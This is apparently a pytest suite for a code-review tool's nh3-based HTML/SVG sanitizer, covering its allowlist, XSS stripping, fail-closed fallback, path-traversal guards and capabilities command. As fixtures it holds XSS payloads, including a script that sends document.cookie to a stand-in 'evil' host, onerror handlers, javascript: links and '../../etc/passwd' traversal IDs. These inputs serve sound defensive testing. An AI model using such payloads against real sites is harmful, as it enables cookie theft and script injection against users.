"""Tests for Phase 4: nh3 detail-sidecar sanitization + capability detection.

Covers ``sanitize_detail_html`` (the HTML + SVG allowlist, script/event/external
href stripping, fail-closed when nh3 is absent), the sidecar resolver, the canvas
embedding of an already-sanitized fragment, the ``render-review`` end-to-end
embedding, and the ``capabilities`` subcommand the orchestrator gates
``rich_html`` on before assessment.
"""

from __future__ import annotations

import argparse
import importlib
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

# Import the module under test via its hyphenated filename.
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
fr = importlib.import_module("focused-review")

SCRIPT_PATH = str(Path(__file__).resolve().parent.parent / "focused-review.py")

# The allowlist / XSS tests exercise the real Rust sanitizer; skip them only when
# nh3 is genuinely missing from the environment (it is a declared dependency, so
# the normal case runs them). The fail-closed tests run regardless — they force
# ``_nh3 = None`` to assert the safe degradation.
requires_nh3 = pytest.mark.skipif(fr._nh3 is None, reason="nh3 not installed")


# ---------------------------------------------------------------------------
# Fixtures / helpers
# ---------------------------------------------------------------------------


def _one_finding_env(*, has_detail: bool = True) -> dict:
    """A minimal, fully valid one-finding envelope (Confirmed) for CLI tests."""
    return {
        "schema_version": 1,
        "run": {
            "run_id": "R1",
            "scope": "branch",
            "date": "2026-02-03T10:00:00Z",
            "rule_count": 1,
            "concern_count": 1,
            "consolidated_count": 1,
            "confirmed": 1,
            "questionable": 0,
            "invalid": 0,
        },
        "rebuttal_overrides": [],
        "rule_quality_notes": [],
        "findings": [
            {
                "record_id": "r1",
                "assessment_id": "A-01",
                "display_number": 1,
                "title": "Finding one",
                "file": "src/a.py",
                "line": 10,
                "original_severity": "High",
                "severity": "High",
                "fix_complexity": "moderate",
                "verdict": "Confirmed",
                "type": "concern",
                "description": "A description.",
                "assessment": "An assessment.",
                "suggestion": "A suggestion.",
                "provenance": ["rule--null-safety"],
                "has_detail": has_detail,
            }
        ],
    }


# A representative assessor-authored sidecar exercising the palette + every threat
# class the allowlist must neutralize.
RICH_SIDECAR = """
<div class="callout warn" style="color:red">Heads up</div>
<div class="code-block"><span class="highlight-line del">- old</span><span class="highlight-line add">+ new</span></div>
<svg viewBox="0 0 100 40" xmlns="http://www.w3.org/2000/svg">
  <defs><linearGradient id="g"><stop offset="0" stop-color="#89b4fa"/></linearGradient></defs>
  <rect x="0" y="0" width="40" height="20" fill="url(#g)"/>
  <line x1="40" y1="10" x2="80" y2="10" stroke="#cdd6f4" stroke-width="2"/>
  <text x="10" y="14" text-anchor="middle">A</text>
  <script>fetch("//evil/" + document.cookie)</script>
  <foreignObject><div onclick="x()">html</div></foreignObject>
  <animate attributeName="x" to="100"/>
</svg>
<a href="https://evil.com/steal">external</a>
<a href="#anchor">internal</a>
<img src="x" onerror="alert(1)">
<div onclick="steal()" onmouseover="y()">handlers</div>
<iframe src="http://evil"></iframe>
"""


def _write_sidecar(run_dir: Path, assessment_id: str, html: str) -> Path:
    assessments = run_dir / "assessments"
    assessments.mkdir(parents=True, exist_ok=True)
    path = assessments / f"{assessment_id}-detail.html"
    path.write_text(html, encoding="utf-8")
    return path


def _render_args(records: Path, **overrides) -> argparse.Namespace:
    ns = argparse.Namespace(
        records=str(records),
        run_dir=None,
        repo=".",
        review_out=None,
        canvas_out=None,
        template=None,
    )
    for key, value in overrides.items():
        setattr(ns, key, value)
    return ns


# ---------------------------------------------------------------------------
# sanitize_detail_html — HTML + SVG allowlist
# ---------------------------------------------------------------------------


@requires_nh3
class TestSanitizeAllowlist:
    def test_palette_html_and_inline_style_kept(self) -> None:
        out = fr.sanitize_detail_html(
            '<div class="callout warn" style="color:red">x</div>'
        )
        assert 'class="callout warn"' in out
        # Inline style is intentionally kept (CSP, not nh3, owns the exfil vector).
        assert "style=" in out and "color:red" in out

    def test_code_block_palette_structure_kept(self) -> None:
        out = fr.sanitize_detail_html(
            '<div class="code-block"><span class="highlight-line add">+ new</span></div>'
        )
        assert 'class="code-block"' in out
        assert 'class="highlight-line add"' in out

    def test_svg_shape_and_camelcase_attrs_kept(self) -> None:
        out = fr.sanitize_detail_html(
            '<svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">'
            '<path d="M0 0L10 10" stroke="red"/></svg>'
        )
        assert "<svg" in out
        # camelCase SVG attribute survives the HTML parser's foreign-content fixup.
        assert "viewBox=" in out
        assert "<path" in out and 'd="M0 0L10 10"' in out

    def test_svg_gradient_camelcase_tag_kept(self) -> None:
        out = fr.sanitize_detail_html(
            '<svg><linearGradient id="g"><stop offset="0" stop-color="red"/>'
            "</linearGradient></svg>"
        )
        assert "<linearGradient" in out
        assert "<stop" in out

    def test_script_carrying_svg_strips_script_keeps_shape(self) -> None:
        out = fr.sanitize_detail_html(
            '<svg><script>alert(1)</script>'
            '<rect x="0" y="0" width="5" height="5"/></svg>'
        )
        assert "<script" not in out
        assert "alert(1)" not in out  # content removed, not merely escaped
        assert "<rect" in out  # the legitimate shape survives

    def test_svg_animation_and_foreignobject_stripped(self) -> None:
        out = fr.sanitize_detail_html(
            "<svg><rect width=\"5\" height=\"5\">"
            '<animate attributeName="x" to="100"/><set attributeName="y" to="9"/>'
            "</rect>"
            '<foreignObject><div onclick="x()">h</div></foreignObject></svg>'
        )
        assert "<animate" not in out
        assert "<set" not in out
        assert "foreignObject" not in out
        assert "onclick" not in out
        assert "<rect" in out


# ---------------------------------------------------------------------------
# sanitize_detail_html — XSS neutralization
# ---------------------------------------------------------------------------


@requires_nh3
class TestSanitizeXss:
    def test_script_tag_content_removed(self) -> None:
        out = fr.sanitize_detail_html("<div>safe<script>steal()</script></div>")
        assert "<script" not in out
        assert "steal()" not in out
        assert "safe" in out

    def test_event_handlers_stripped(self) -> None:
        out = fr.sanitize_detail_html('<div onclick="evil()" onmouseover="x()">t</div>')
        assert "onclick" not in out
        assert "onmouseover" not in out
        assert ">t<" in out or "t</div>" in out

    def test_img_onerror_removed(self) -> None:
        out = fr.sanitize_detail_html('<img src="x" onerror="alert(1)">')
        assert "onerror" not in out
        assert "<img" not in out  # img is not in the allowlist at all

    def test_javascript_href_stripped(self) -> None:
        out = fr.sanitize_detail_html('<a href="javascript:alert(1)">x</a>')
        assert "javascript:" not in out
        assert "href=" not in out  # the bad target is dropped entirely

    def test_external_href_stripped_fragment_kept(self) -> None:
        out = fr.sanitize_detail_html(
            '<a href="https://evil.com/x">ext</a><a href="#frag">int</a>'
        )
        assert "evil.com" not in out
        assert 'href="#frag"' in out  # same-document fragment is allowed

    def test_svg_use_external_href_stripped(self) -> None:
        out = fr.sanitize_detail_html('<svg><use href="http://evil/x#y"/></svg>')
        assert "evil" not in out
        assert "http" not in out

    def test_iframe_removed(self) -> None:
        out = fr.sanitize_detail_html('<iframe src="http://evil"></iframe>')
        assert "<iframe" not in out
        assert "evil" not in out

    def test_html_comments_stripped(self) -> None:
        # strip_comments=True: a comment can't smuggle a forged canvas marker.
        out = fr.sanitize_detail_html("<div>a<!-- FR:QUALITY_NOTES -->b</div>")
        assert "<!--" not in out
        assert "FR:QUALITY_NOTES" not in out

    def test_title_desc_rcdata_mxss_neutralized(self) -> None:
        # <title>/<desc> are allowlisted (SVG tooltips) and are classic
        # RCDATA-context mXSS sinks; markup inside them must never come back live.
        out = fr.sanitize_detail_html(
            "<svg><title><img src=x onerror=alert(1)></title>"
            "<desc><script>steal()</script></desc></svg>"
        )
        assert "onerror" not in out
        assert "<img" not in out
        assert "<script" not in out
        assert "steal()" not in out


# ---------------------------------------------------------------------------
# Fail-closed: no nh3 -> None (escaped text only, never raw HTML)
# ---------------------------------------------------------------------------


class TestFailClosed:
    def test_sanitize_returns_none_without_nh3(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(fr, "_nh3", None)
        assert fr.sanitize_detail_html("<b>x</b>") is None

    def test_resolve_returns_none_without_nh3(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        _write_sidecar(tmp_path, "A-01", "<div>rich</div>")
        finding = {"has_detail": True, "assessment_id": "A-01", "record_id": "r1"}
        monkeypatch.setattr(fr, "_nh3", None)
        # The sidecar file exists and loads, but with no sanitizer we fail closed.
        assert fr._resolve_finding_detail(str(tmp_path), finding) is None

    def test_render_review_falls_back_to_text_without_nh3(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        records = tmp_path / "records.json"
        records.write_text(json.dumps(_one_finding_env()), encoding="utf-8")
        _write_sidecar(tmp_path, "A-01", '<svg><rect width="5" height="5"/></svg>')
        canvas_out = tmp_path / "canvas.html"

        monkeypatch.setattr(fr, "_nh3", None)
        fr.render_review(
            _render_args(records, run_dir=str(tmp_path), canvas_out=str(canvas_out))
        )

        canvas = canvas_out.read_text(encoding="utf-8")
        # No raw sidecar HTML embedded, and no rich-detail wrapper around content.
        assert "<rect" not in canvas
        assert '<div class="rich-detail">' not in canvas
        # The escaped structural text fields are still rendered (text-only panel).
        assert "A description." in canvas


# ---------------------------------------------------------------------------
# _resolve_finding_detail — load + sanitize a sidecar (or None)
# ---------------------------------------------------------------------------


class TestResolveFindingDetail:
    def _finding(self, **overrides) -> dict:
        f = {"has_detail": True, "assessment_id": "A-01", "record_id": "r1"}
        f.update(overrides)
        return f

    def test_no_run_dir_returns_none(self) -> None:
        assert fr._resolve_finding_detail(None, self._finding()) is None

    def test_has_detail_false_returns_none(self, tmp_path: Path) -> None:
        _write_sidecar(tmp_path, "A-01", "<div>rich</div>")
        assert fr._resolve_finding_detail(str(tmp_path), self._finding(has_detail=False)) is None

    def test_missing_assessment_id_returns_none(self, tmp_path: Path) -> None:
        assert fr._resolve_finding_detail(str(tmp_path), self._finding(assessment_id=None)) is None

    def test_missing_sidecar_file_returns_none(self, tmp_path: Path) -> None:
        # has_detail True but the assessor wrote no file -> graceful text fallback.
        assert fr._resolve_finding_detail(str(tmp_path), self._finding()) is None

    def test_path_traversal_assessment_id_rejected(self, tmp_path: Path) -> None:
        # Plant a file exactly where "../../evil" would resolve to, so this test
        # would FAIL (read the planted file) if the charset guard were removed.
        run_dir = tmp_path / "run"
        (run_dir / "assessments").mkdir(parents=True)
        (tmp_path / "evil-detail.html").write_text("<div>secret</div>", encoding="utf-8")
        finding = self._finding(assessment_id="../../evil")
        assert fr._resolve_finding_detail(str(run_dir), finding) is None

    @pytest.mark.parametrize("bad_id", ["../../etc/passwd", "a/b", "a\\b", "a\x00b", "a.b", "", "  "])
    def test_unsafe_assessment_ids_return_none(self, tmp_path: Path, bad_id: str) -> None:
        # Separators / traversal / null bytes / dots all fail closed to text
        # (the null byte case would otherwise raise ValueError and abort render).
        assert fr._resolve_finding_detail(str(tmp_path), self._finding(assessment_id=bad_id)) is None

    @requires_nh3
    def test_happy_path_returns_sanitized_html(self, tmp_path: Path) -> None:
        _write_sidecar(
            tmp_path, "A-01", '<div class="callout">x</div><script>bad()</script>'
        )
        out = fr._resolve_finding_detail(str(tmp_path), self._finding())
        assert out is not None
        assert 'class="callout"' in out
        assert "<script" not in out

    @requires_nh3
    def test_sidecar_sanitizing_to_empty_returns_none(self, tmp_path: Path) -> None:
        # Only disallowed markup -> sanitizes to whitespace -> treated as no detail.
        _write_sidecar(tmp_path, "A-01", "<script>only()</script>   ")
        assert fr._resolve_finding_detail(str(tmp_path), self._finding()) is None

    def test_sidecar_path_shape(self, tmp_path: Path) -> None:
        path = fr._detail_sidecar_path(str(tmp_path), "A-07")
        assert path.endswith(os.path.join("assessments", "A-07-detail.html"))


# ---------------------------------------------------------------------------
# Canvas embedding of a pre-sanitized fragment (no file IO / nh3 needed)
# ---------------------------------------------------------------------------


class TestCanvasEmbedding:
    def _canvas(self, details: dict | None) -> str:
        template = fr.CANVAS_TEMPLATE_PATH.read_text(encoding="utf-8")
        return fr.render_canvas_html(_one_finding_env(), template, details)

    def test_detail_embedded_in_finding_panel(self) -> None:
        out = self._canvas({"r1": '<svg class="diagram"><rect/></svg>'})
        block = out.split('data-record-id="r1"', 1)[1].split("</details>", 1)[0]
        assert '<div class="rich-detail">' in block
        # Embedded raw (already sanitized) — NOT re-escaped, or the feature is moot.
        assert '<svg class="diagram">' in block
        assert "&lt;svg" not in block

    def test_detail_follows_structural_fields(self) -> None:
        out = self._canvas({"r1": "<p>RICH_MARKER</p>"})
        block = out.split('data-record-id="r1"', 1)[1].split("</details>", 1)[0]
        # The rich-detail panel comes after the escaped Suggestion section.
        assert block.index("Suggestion") < block.index("RICH_MARKER")

    def test_no_detail_mapping_renders_text_only(self) -> None:
        out = self._canvas(None)
        block = out.split('data-record-id="r1"', 1)[1].split("</details>", 1)[0]
        assert "rich-detail" not in block
        assert "A description." in block  # text-only panel still rendered

    def test_unmapped_finding_has_no_detail(self) -> None:
        # details present but keyed to a different record_id -> this one stays text.
        out = self._canvas({"other": "<p>nope</p>"})
        block = out.split('data-record-id="r1"', 1)[1].split("</details>", 1)[0]
        assert "rich-detail" not in block

    def test_details_keyed_per_finding(self) -> None:
        # Two findings, each with its own sidecar: detail must land only in the
        # block whose record_id it is keyed to (locks the record_id -> detail map).
        env = _one_finding_env()
        second = dict(env["findings"][0])
        second.update(record_id="r2", assessment_id="A-02", display_number=2, title="Finding two")
        env["findings"].append(second)
        template = fr.CANVAS_TEMPLATE_PATH.read_text(encoding="utf-8")
        out = fr.render_canvas_html(
            env, template, {"r1": "<p>DETAIL_ONE</p>", "r2": "<p>DETAIL_TWO</p>"}
        )
        block1 = out.split('data-record-id="r1"', 1)[1].split("</details>", 1)[0]
        block2 = out.split('data-record-id="r2"', 1)[1].split("</details>", 1)[0]
        assert "DETAIL_ONE" in block1 and "DETAIL_TWO" not in block1
        assert "DETAIL_TWO" in block2 and "DETAIL_ONE" not in block2


# ---------------------------------------------------------------------------
# render-review CLI: end-to-end embedding + sanitization
# ---------------------------------------------------------------------------


@requires_nh3
class TestRenderReviewSidecar:
    def _run(self, tmp_path: Path, sidecar: str = RICH_SIDECAR) -> str:
        records = tmp_path / "records.json"
        records.write_text(json.dumps(_one_finding_env()), encoding="utf-8")
        _write_sidecar(tmp_path, "A-01", sidecar)
        canvas_out = tmp_path / "canvas.html"
        fr.render_review(
            _render_args(records, run_dir=str(tmp_path), canvas_out=str(canvas_out))
        )
        return canvas_out.read_text(encoding="utf-8")

    def test_palette_embedded(self, tmp_path: Path) -> None:
        canvas = self._run(tmp_path)
        assert '<div class="rich-detail">' in canvas
        assert 'class="callout warn"' in canvas
        assert 'class="code-block"' in canvas
        assert "<svg" in canvas and "<rect" in canvas

    def test_xss_neutralized_in_written_canvas(self, tmp_path: Path) -> None:
        canvas = self._run(tmp_path)
        # Script / animation / foreignObject / handlers / external links all gone.
        assert "document.cookie" not in canvas
        assert "<script>fetch" not in canvas
        assert "foreignObject" not in canvas
        assert "<animate" not in canvas
        assert "onclick" not in canvas
        assert "onerror" not in canvas
        assert "evil.com" not in canvas
        assert "<iframe" not in canvas

    def test_internal_anchor_and_inline_style_survive(self, tmp_path: Path) -> None:
        canvas = self._run(tmp_path)
        assert 'href="#anchor"' in canvas
        assert "color:red" in canvas


# ---------------------------------------------------------------------------
# capabilities subcommand
# ---------------------------------------------------------------------------


class TestCapabilities:
    def test_reports_available_when_nh3_present(
        self, capsys: pytest.CaptureFixture[str], monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Force a known module object so the test is independent of the real env.
        class _FakeNh3:
            __version__ = "9.9.9"

        monkeypatch.setattr(fr, "_nh3", _FakeNh3())
        fr.capabilities(argparse.Namespace())
        payload = json.loads(capsys.readouterr().out)
        assert payload["nh3"] is True
        assert payload["rich_html"] is True
        assert payload["nh3_version"] == "9.9.9"

    def test_reports_unavailable_when_nh3_absent(
        self, capsys: pytest.CaptureFixture[str], monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(fr, "_nh3", None)
        fr.capabilities(argparse.Namespace())
        payload = json.loads(capsys.readouterr().out)
        assert payload["nh3"] is False
        assert payload["rich_html"] is False
        assert payload["nh3_version"] is None

    def test_rich_html_mirrors_nh3(
        self, capsys: pytest.CaptureFixture[str]
    ) -> None:
        # The real environment value — rich_html must track nh3 either way.
        fr.capabilities(argparse.Namespace())
        payload = json.loads(capsys.readouterr().out)
        assert payload["rich_html"] == payload["nh3"]
        assert payload["nh3"] == (fr._nh3 is not None)


class TestCapabilitiesCLI:
    """Real-subprocess check that the subcommand is wired into ``main()``."""

    def test_cli_emits_valid_json(self) -> None:
        result = subprocess.run(
            [sys.executable, SCRIPT_PATH, "capabilities"],
            capture_output=True,
            text=True,
        )
        assert result.returncode == 0, result.stderr
        payload = json.loads(result.stdout)
        assert set(payload) >= {"nh3", "rich_html", "nh3_version", "schema_version"}
        assert isinstance(payload["nh3"], bool)
